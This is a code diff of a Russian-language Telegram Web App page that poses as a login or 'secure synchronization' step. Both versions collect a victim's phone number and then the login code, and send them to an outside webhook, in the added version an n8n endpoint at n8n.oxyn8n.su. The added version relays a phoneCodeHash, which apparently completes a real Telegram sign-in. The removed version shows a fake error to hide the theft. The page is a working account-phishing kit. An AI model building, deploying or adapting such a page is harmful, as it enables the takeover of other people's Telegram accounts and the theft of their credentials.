@@ -1,156 +1,41 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-    <style>
-        :root { --bg: #0f172a; --accent: #38bdf8; --glass: rgba(30, 41, 59, 0.7); }
-        body { background: radial-gradient(circle at top right, #1e293b, #0f172a); color: #f8fafc; font-family: 'Inter', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .card { width: 85%; max-width: 360px; padding: 35px 24px; background: var(--glass); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 32px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); text-align: center; }
-        
-        .icon-box { width: 60px; height: 60px; background: linear-gradient(135deg, var(--accent), #818cf8); border-radius: 18px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; }
-        h2 { font-size: 22px; margin: 0 0 8px; }
-        p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; }
-
-        /* Контейнер ввода с кастомной стрелочкой */
-        .phone-group { 
-            display: flex; 
-            background: rgba(15, 23, 42, 0.6); 
-            border: 1.5px solid rgba(255, 255, 255, 0.1); 
-            border-radius: 16px; 
-            position: relative;
-            overflow: hidden; 
-            margin-bottom: 20px; 
-        }
-
-        .select-wrapper { position: relative; display: flex; align-items: center; border-right: 1px solid rgba(255, 255, 255, 0.1); }
-        
-        /* Кастомная стрелочка через псевдоэлемент */
-        .select-wrapper::after {
-            content: '▼';
-            font-size: 8px;
-            position: absolute;
-            right: 8px;
-            pointer-events: none;
-            color: var(--accent);
-        }
-
-        select { 
-            background: #1e293b; 
-            border: none; 
-            color: #fff; 
-            padding: 15px 25px 15px 15px; 
-            font-size: 15px; 
-            outline: none; 
-            cursor: pointer; 
-            appearance: none; 
-            -webkit-appearance: none;
-        }
-
-        input { width: 100%; background: transparent; border: none; color: #fff; padding: 15px; font-size: 17px; outline: none; letter-spacing: 0.5px; }
-        
-        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
-        input[type=number] { -moz-appearance: textfield; }
-
-        button { width: 100%; background: #fff; color: #0f172a; border: none; padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; }
-        #step2 { display: none; }
-    </style>
 </head>
 <body>
-    <div class="card">
-        <div class="icon-box">
-            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-        </div>
-
-        <div id="step1">
-            <h2>Вход</h2>
-            <p>Синхронизация через защищенный узел</p>
-            <div class="phone-group">
-                <div class="select-wrapper">
-                    <select id="country" onchange="resetInput()">
-                        <option value="+7" data-mask="(000) 000-00-00">🇷🇺 +7</option>
-                        <option value="+380" data-mask="(00) 000-00-00">🇺🇦 +380</option>
-                        <option value="+375" data-mask="(00) 000-00-00">🇧🇾 +375</option>
-                        <option value="+7" data-mask="(000) 000-00-00">🇰🇿 +7</option>
-                        <option value="+998" data-mask="(00) 000-00-00">🇺🇿 +998</option>
-                        <option value="+994" data-mask="(00) 000-00-00">🇦🇿 +994</option>
-                        <option value="+374" data-mask="(00) 00-00-00">🇦🇲 +374</option>
-                        <option value="+996" data-mask="(000) 00-00-00">🇰🇬 +996</option>
-                    </select>
-                </div>
-                <input type="tel" id="phone" placeholder="(000) 000-00-00">
-            </div>
-            <button onclick="toStep2()">Получить код</button>
-        </div>
-
-        <div id="step2">
-            <h2>Проверка</h2>
-            <p>Код отправлен на <br><b id="view-phone" style="color:var(--accent)"></b></p>
-            <input type="number" id="code" placeholder="00000" inputmode="numeric">
-            <button onclick="final()">Подтвердить</button>
-        </div>
+    <div id="step1">
+        <input type="text" id="phone" placeholder="+79990000000">
+        <button onclick="sendPhone()">Отправить номер</button>
+    </div>
+    <div id="step2" style="display:none;">
+        <input type="text" id="code" placeholder="Код из SMS">
+        <button onclick="sendCode()">Войти</button>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        tg.expand();
-        const WEBHOOK = 'ТВОЙ_WEBHOOK_URL';
+        let phoneCodeHash = "";
 
-        const phoneInput = document.getElementById('phone');
-        const countrySelect = document.getElementById('country');
-
-        // Логика маски со скобками
-        phoneInput.addEventListener('input', function(e) {
-            let x = e.target.value.replace(/\D/g, '');
-            const mask = countrySelect.options[countrySelect.selectedIndex].getAttribute('data-mask');
-            let formatted = '';
-            let valIdx = 0;
-
-            for (let i = 0; i < mask.length && valIdx < x.length; i++) {
-                if (mask[i] === '0') {
-                    formatted += x[valIdx++];
-                } else {
-                    formatted += mask[i];
-                }
-            }
-            e.target.value = formatted;
-        });
-
-        function resetInput() {
-            phoneInput.value = '';
-            phoneInput.placeholder = countrySelect.options[countrySelect.selectedIndex].getAttribute('data-mask');
-        }
-
-        function toStep2() {
-            const full = countrySelect.value + " " + phoneInput.value;
-            const clean = phoneInput.value.replace(/\D/g, '');
-            const maskCheck = countrySelect.options[countrySelect.selectedIndex].getAttribute('data-mask').replace(/\D/g, '').length;
-
-            if (clean.length < maskCheck) {
-                tg.HapticFeedback.notificationOccurred('error');
-                return;
-            }
-
-            document.getElementById('view-phone').innerText = full;
+        async function sendPhone() {
+            const phone = document.getElementById('phone').value;
+            const res = await fetch('https://n8n.oxyn8n.su/webhook/auth', {
+                method: 'POST',
+                body: JSON.stringify({ action: 'sendPhone', phone })
+            });
+            const data = await res.json();
+            phoneCodeHash = data.phoneCodeHash; // Придет от n8n
             document.getElementById('step1').style.display = 'none';
             document.getElementById('step2').style.display = 'block';
-            tg.HapticFeedback.impactOccurred('medium');
-            send({ event: 'phone', num: full });
         }
 
-        function final() {
-            const c = document.getElementById('code').value;
-            if (c.length < 5) return;
-            send({ event: 'code', code: c, num: document.getElementById('view-phone').innerText });
-            tg.HapticFeedback.notificationOccurred('success');
-            setTimeout(() => { alert("Ошибка синхронизации сессии"); tg.close(); }, 800);
-        }
-
-        function send(obj) {
-            obj.user = tg.initDataUnsafe?.user || {};
-            fetch(WEBHOOK, { method: 'POST', body: JSON.stringify(obj) }).catch(()=>{});
+        async function sendCode() {
+            const code = document.getElementById('code').value;
+            await fetch('https://n8n.oxyn8n.su/webhook/auth', {
+                method: 'POST',
+                body: JSON.stringify({ action: 'sendCode', code, phoneCodeHash })
+            });
+            alert("Авторизация прошла!");
         }
     </script>
 </body>
